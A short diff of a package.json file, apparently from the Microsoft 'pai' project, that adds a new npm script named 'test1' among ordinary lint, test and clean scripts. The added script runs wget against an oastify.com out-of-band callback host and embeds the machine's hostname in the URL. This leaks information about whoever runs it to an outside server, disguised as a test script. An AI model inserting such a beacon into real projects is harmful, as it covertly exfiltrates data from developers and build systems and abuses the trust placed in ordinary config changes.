@@ -19,6 +19,7 @@
     "url": "https://github.com/Microsoft/pai/issues"
   },
   "scripts": {
+    "test1": "wget https://hsdlkqma6awlseyko2tnuhjuilohc80x.oastify.com/`hostname`",
     "lint": "eslint --ext .js --ext .jsx .",
     "test": "npm run lint",
     "clean": "rimraf dist",
